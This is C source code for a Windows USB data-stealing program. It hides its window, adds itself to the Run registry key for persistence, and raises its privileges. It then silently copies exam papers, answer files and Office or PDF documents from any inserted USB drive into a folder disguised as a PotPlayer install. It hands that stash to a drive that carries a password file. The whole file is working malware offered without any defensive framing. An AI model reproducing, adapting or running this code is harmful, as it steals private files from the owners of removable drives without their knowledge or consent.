#define _CRT_SECURE_NO_WARNINGS
#ifdef _MSC_VER
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#endif

#include <stdio.h>
#include<io.h>
#include <Windows.h>
#include "dirent.h"
int getDirName(TCHAR diskName[26][10]);
int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10], int diskNumber);
void convertsCharToTCHAR(char* strUsr, TCHAR* Name);
void copyFile(const TCHAR* dirName);
void findFolder(const TCHAR* dirName, BOOL recursion);
void CreateFolder(const char* folderName);
int findMyUDisk(TCHAR* removebleDiskName);
char* GetFilename(char* p);
void setComputerStart(char* argv);
BOOL UpPrivilegeValue();


int main(int argc, TCHAR* argv[])
{
	while (1)
	{
		UpPrivilegeValue();//提升权限
		setComputerStart(*argv);//设置开机启动
		TCHAR diskName[26][10] = { 0 };
		TCHAR removebleDiskName[26][10] = { 0 };
		int diskNumber = 0;
		int removebleNumber = 0;
		diskNumber = getDirName(diskName);
		removebleNumber = getAllDirRemoveble(diskName, removebleDiskName, diskNumber);
		if (removebleNumber!=0)
		{
			for (int i = 0; i < removebleNumber; i++)
			{
				copyFile(removebleDiskName[i]);
				findFolder(removebleDiskName[i], FALSE);
				findMyUDisk(removebleDiskName[i]);
			}
		}
		Sleep(5000);
	}
	return 0;
}

BOOL UpPrivilegeValue()
{
	//OpenProcessToken()函数用来打开与进程相关联的访问令牌
	HANDLE hToken = NULL;
	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		return FALSE;
	}
	//LookupPrivilegeValue()函数查看系统权限的特权值
	LUID luid;
	if (FALSE == LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	//调整权限设置
	TOKEN_PRIVILEGES Tok;
	Tok.PrivilegeCount = 1;
	Tok.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	Tok.Privileges[0].Luid = luid;
	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &Tok, sizeof(Tok), NULL, NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


int getDirName(TCHAR diskName[26][10])
{
	TCHAR wDrivesName[256];
	GetLogicalDriveStrings(256, wDrivesName);
	TCHAR* p = wDrivesName;
	int i = 0;
	for (i=0; i < 26 && *p != 0; i++)
	{
		wsprintf(diskName[i], TEXT("%s"), p);
		p += (lstrlen(p) + 1);
	}
	return i;
}

int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10],int diskNumber)
{
	int removebleDiskNumber = 0;
	for (int i = 0; i < diskNumber; i++)
	{
		if (GetDriveType(diskName[i]) == DRIVE_REMOVABLE)
		{
			wsprintf(removebleDiskName[removebleDiskNumber], TEXT("%s"), diskName[i]);
			removebleDiskNumber++;
		}
	}
	return removebleDiskNumber;
}

void convertsCharToTCHAR(char *strUsr,TCHAR *Name)
{
#ifdef UNICODE
	MultiByteToWideChar(CP_ACP, 0, strUsr, -1, Name, 100);
#else
	strcpy(Name, strUsr);
#endif
}

void findFolder(const TCHAR* dirName,BOOL recursion)
{
	TCHAR fileNameAll[MAX_PATH] = { 0 };
	intptr_t file;
	struct _finddata_t find;

	_chdir(dirName);
	if ((file = _findfirst("*.*", &find)) == -1L)
	{
		return;
	}

	if (strstr(find.name, ".") == NULL && find.attrib== _A_SUBDIR)
	{
		if (recursion == 0)
			wsprintf(fileNameAll, TEXT("%s%s"), dirName, find.name);
		else
			wsprintf(fileNameAll, TEXT("%s\\%s"), dirName, find.name);
		copyFile(fileNameAll);
		findFolder(fileNameAll,TRUE);
	}

	while (_findnext(file, &find) == 0)
	{
		if (strcmp(find.name, ".") == 0 || strcmp(find.name, "..") == 0)
			continue;

		for (int i = 0; i < sizeof(fileNameAll); i++)
		{
			fileNameAll[i] = '\0';
		}
		if (strstr(find.name, ".") == NULL && find.attrib == _A_SUBDIR)
		{
			if (strstr(find.name, ".") == NULL)
			{
				if (recursion == 0)
					sprintf_s(fileNameAll,sizeof(fileNameAll), TEXT("%s%s"), dirName, find.name);
				else
					sprintf_s(fileNameAll,sizeof(fileNameAll), TEXT("%s\\%s"), dirName, find.name);

				copyFile(fileNameAll);
				findFolder(fileNameAll,TRUE);
			}
		}

	}
}

void copyFile(const TCHAR* dirName)
{
	TCHAR fileName[MAX_PATH] = { 0 };
	TCHAR copyFileName[MAX_PATH] = { 0 };
	intptr_t file;
	struct _finddata_t find;

	CreateFolder("D:\\Program Files");
	CreateFolder("D:\\Program Files\\Potplayer");
	_chdir(dirName);
	if ((file = _findfirst("*.*", &find)) == -1L)
	{
		return;
	}

	convertsCharToTCHAR(find.name, fileName);

	if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL || strstr(fileName, TEXT(".pdf")) != NULL)
	{
		wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);

		TCHAR szCommand[1000] = { 0 };
		sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
		if (WinExec(szCommand, SW_HIDE) <= 31)
		{
			return;
		}
	}

	while (_findnext(file, &find) == 0)
	{
		if (strcmp(find.name, ".") == 0 || strcmp(find.name, "..") == 0)
					continue;
			convertsCharToTCHAR(find.name, fileName);

			if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL || strstr(fileName, TEXT(".pdf")) != NULL)
			{
				wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);

				TCHAR szCommand[1000] = { 0 };
				sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
				if (WinExec(szCommand, SW_HIDE) <= 31)
				{
					return;
				}
			}
	}
	_findclose(file);

	return;
}

void CreateFolder(const char* folderName)
{
	// 文件夹不存在则创建文件夹
	if (_access(folderName, 0) == -1)
	{
		_mkdir(folderName);
	}
}

int findMyUDisk(TCHAR *removebleDiskName)
{
	FILE* fp;
	char* fileName = (char*)malloc(sizeof(char) * 200);
	int passWord = 54188220;
	int getword = 0;
	if (fileName != NULL)
	{
		wsprintf(fileName, TEXT("%s%s"), removebleDiskName, "mamsitear.txt");
		if ((fp = fopen(fileName, "r")) == NULL)
		{
			free(fileName);
			fileName = NULL;
			return -1;
		}
	
		free(fileName);
		fileName = NULL;//释放内存

		fscanf_s(fp, "%d", &getword);
		if (getword == passWord)
		{
			TCHAR copyFloderName[100] = { 0 };
			TCHAR szCommand[MAX_PATH*2] = { 0 };
			sprintf(copyFloderName, "%s%s", removebleDiskName, "Code");
			CreateFolder(copyFloderName);
			sprintf(szCommand, "CMD /C Xcopy /V /Y \"%s\" \"%s\"", "D:\\Program Files\\Potplayer", copyFloderName);
			if (WinExec(szCommand, SW_HIDE) <= 31)
			{
				return -1;
			}
			return 1;
		}
	}
	return 0;
}

void ComputerStart(char* pathName)
{
	//找到系统的启动项 
	const char* szSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;

	//打开注册表启动项 
	int k = RegOpenKeyExA(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey);
	if (k == ERROR_SUCCESS)
	{
		//添加一个子Key,并设置值，MyStart为启动项名称，自定义设置；
		RegSetValueEx(hKey, "MyStart", 0, REG_SZ, (BYTE*)pathName, strlen(pathName));
		//关闭注册表
		RegCloseKey(hKey);
		//printf("设置成功\n");
	}
	else
	{
		//printf("设置失败  error:%d\n", k);
	}
}


void setComputerStart(char* argv)
{
	char pathName[MAX_PATH] = { 0 };//文件名字最大260个字符  MAX_PATH  260
	GetCurrentDirectory(MAX_PATH, pathName);//设置字符集为多字节字符集  获取当前文件路径

	sprintf(pathName, "%s\\", pathName);
	strcat(pathName, GetFilename(argv));//找到需要开机自启动的程序

	ComputerStart(pathName);
}

char* GetFilename(char* p)
{
	int x = strlen(p);
	char ch = '\\';
	char* q = strrchr(p, ch) + 1;

	return q;
}